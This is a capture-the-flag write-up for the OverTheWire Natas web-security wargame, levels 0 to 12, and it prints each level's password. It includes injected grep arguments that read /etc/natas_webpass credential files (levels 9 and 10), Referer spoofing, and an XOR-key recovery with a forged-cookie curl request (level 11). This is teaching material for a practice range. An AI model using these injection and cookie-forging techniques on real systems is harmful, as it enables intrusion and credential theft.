# Solving [Natas@overthewire.org](https://overthewire.org/wargames/natas/)

## Intro

Natas teaches the basics of serverside web-security.

Each level of natas consists of its own website located at http://natasX.natas.labs.overthewire.org, where X is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.

Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.

## [Level 0](http://natas0.natas.labs.overthewire.org)

```
Username: natas0
Password: natas0
```

### Solution

Visit source code of the webpage and look for the password there.

## [Level 1](http://natas1.natas.labs.overthewire.org)

```
Username: natas1
Password: g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
```

### Solution

Same as before, but accessing web source code through, for example, f12.

## [Level 2](http://natas2.natas.labs.overthewire.org)

```
Username: natas2
Password: h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
```

### Solution

1. Check source code of webpage.
2. Notice a suspicious pixel.png element.
3. Notice that there is an accessible `file` directory open in which the pixel file is located.
4. Get into http://natas2.natas.labs.overthewire.org/files/ and open the `user.txt` file in order to get access to the next level.

## [Level 3](http://natas3.natas.labs.overthewire.org)

```
Username: natas3
Password: G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
```

### Solution

The website appears empty.

After checking several URLs like `/files/` (as in the previous level) and `sitemap` , we find something at `http://natas3.natas.labs.overthewire.org/robots.txt` .

According to https://seocrawl.com/, Robots.txt is a special file known to SEOs (and programmers as well) which provides useful directives to search engine crawlers.

The content:

```
User-agent: *
Disallow: /s3cr3t/
```

The "Disallow" prevents search engines from accessing the `/s3cr3t/` directory, which is were the password for the next level is stored.

## [Level 4](http://natas4.natas.labs.overthewire.org)

```
Username: natas4
Password: tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
```

### Solution

The password for the next level is retrieved if the page is visited from `http://natas5.natas.labs.overthewire.org` .

In order to trick the server, we can add a `Referer` header to the request with the value `http://natas5.natas.labs.overthewire.org` .

#referer-spoofing

### Key takeaways

* The `Referer` HTTP request header contains the absolute or partial address from which a resource has been requested. The Referer header allows a server to identify referring pages that people are visiting from or where requested resources are being used. This data can be used for analytics, logging, optimized caching, and more.

**Source**: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer

## [Level 5](http://natas5.natas.labs.overthewire.org)

```
Username: natas5
Password: Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
```

### Solution

Among the different headers for the request there is one that says `Cookie` , which is set to `0` . Guess what will happen if we include a header with the same header set to `1` ...

## [Level 6](http://natas6.natas.labs.overthewire.org)

```
Username: natas6
Password: fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
```

### Solution

Consulting "View sourcecode" link, we can notice the secret comes from `includes/secret.inc` . Getting into http://natas6.natas.labs.overthewire.org/includes/secret.inc we will find the password for the form, which will throw the password for the next level.

## [Level 7](http://natas7.natas.labs.overthewire.org)

```
Username: natas7
Password: jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
```

### Solution

According to the links provided, there is an endpoint accepting the `page` parameter that will allow us to get into different resources. Passing a random value to this parameter like `test` throws:

```
Warning: include(test): failed to open stream: No such file or directory in /var/www/natas/natas7/index.php on line 21

Warning: include(): Failed opening 'test' for inclusion (include_path='.:/usr/share/php') in /var/www/natas/natas7/index.php on line 21
```

Also, the source code of the level itself says:

```
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

If we pass that path in the parameter, we get the password for the next level.

## [Level 8](http://natas8.natas.labs.overthewire.org)

```
Username: natas8
Password: a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
```

### Solution

Checking the source code, we can see how the secret was encoded. So it is a matter of decoding it.

```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
```

1. base64 decode
2. reverse string
3. hex2bin

```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function decodeSecret($secret) {
    return base64_decode(strrev(hex2bin($secret)));
}

echo decodeSecret($encodedSecret);

```

Refs:
* https://www.php.net/manual/en/function.bin2hex.php
* https://www.php.net/manual/en/function.strrev
* https://www.php.net/manual/es/function.base64-encode

## [Level 9](http://natas9.natas.labs.overthewire.org) Injection

```
Username: natas9
Password: Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
```

**Source code:**

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

### Solution

Get the following command to make the terminal give us the password for next level. It tells grep to look for any matches on a given location, thus, we use the pass location.

```
. /etc/natas_webpass/natas10 &
```

Refs:
* https://www.php.net/manual/en/function.passthru.php
* https://www.php.net/manual/en/function.array-key-exists.php
* https://www.php.net/manual/en/reserved.variables.request.php

## [Level 10](http://natas10.natas.labs.overthewire.org)

```
Username: natas10
Password: D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
```

### Solution

Same as before, but this time we are not allowed to use &, I guess no problem...

```
. /etc/natas_webpass/natas11
```

## [Level 11](http://natas11.natas.labs.overthewire.org)

```
Username: natas11
Password: 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
```

### Scenario

We get a prompt that says "Cookies are protected with XOR encryption". And "View sourcecode" leads us to a php script. There is also some functionality that lets us input some hex color as `#fffff0` that would then change the background to that color when pressing the "Set color" button.

### Exploration

Based in the following code, we can have a first idea of what the script does.

```php
# The script declares some defaultdata with some content 
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

# loadData is called with $defaultdata, this results in another variable called $data 
$data = loadData($defaultdata);

# $data is updated if a valid color is provided in some global var $_REQUEST
if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}
# saveData is called with the $data variable
saveData($data);

```

So:

* `showpassword` is set to `no`, so it might be a good idea to set it to... `yes`?
* There is a global called `$_REQUEST` that, based in [this](https://www.w3schools.com/php/php_superglobals_request.asp), will collect the color from the input form after pressing "Set color".

If we inspect the functions provided in the rest of the script.

```php
function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}
```

Some more insights:

* There is a global variable called `$_COOKIE` that is apparently set in `saveData` with the `setcookie()` function. The cookie will contain a data field with **encrypted contents**. So basically, it seems like we will have data as in `$defaultdata` but encrypted.
* `loadData` gets the encrypted data in the cookie and returns it decrypted (after some validations).

Finally, we have the encryption algorithm function called `xor_encrypt`

```php
function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
```

**Notes:**
* In php `.=` means concatenation.
* `^` refers to a [bitwise operator][https://www.php.net/manual/en/language.operators.bitwise.php].
{: .notice--primary}

With all the cards on the table, we can now understand our task, which is:

1. Change `showpassword` from `no` to `yes`.
2. In order to do that, we have to modify data in the cookie, which is encrypted. So we have to be able to **decrypt the cookie, and encrypt it again** with the value changed.
3. We have access to the function that encrypts/decrypts data, **but we are missing the cryptographic key**. So we have to be able to retrieve it somehow.
4. Once we have the key, we can bake a cookie that has yest for showpassword. Then making a request to the same web with that cookie should lead to the solution.

### Solution

As the encryption algorithm `XOR` is **reversible** (meaning that if `A ^ B = C` then `A ^ C = B` ) operation, we can play with the known input and output to retrieve the **cryptographic key**.

Normally, the script will work as `INPUT ^ KEY = OUTPUT` , so what we can do is `INPUT ^ OUTPUT = KEY` .

Given that we have a known input (the base64 decoded cookie) and output (the variable `$defaultdata` ), we can apply the following script to retrieve the `KEY` .

```php
function xor_encrypt($text, $key) {
    $outText = '';
    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }
    return $outText;
}
$prev_algorithm_input = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff")); # Known string defaultdata
$prev_algorithm_output = base64_decode("MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D"); # Decoded cookie
$key = xor_encrypt($prev_algorithm_input, $prev_algorithm_output);
echo $key;
```

> KNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLK

This pattern shows us the encryption key, which is `KNHL` .

Using this key we can now retrieve the baked cookie with the altered value.

```php
function xor_encrypt($text) {
    $key = "KNHL";
    $outText = '';
    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }
    return $outText;
}
$BAKED_CONFIG = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
$BAKED_COOKIE = base64_encode(xor_encrypt($BAKED_CONFIG));
echo $BAKED_COOKIE;
```

Which results in the cookie: `MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz`

    

Then, making a request with all the information gathered...

```bash
$ curl --cookie data=MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz -u natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg http://natas11.natas.labs.overthewire.org/
"
[...]
The password for natas12 is YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
[...]
"
```

## [Level 12](http://natas12.natas.labs.overthewire.org)

```
Username: natas12
Password: YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
```
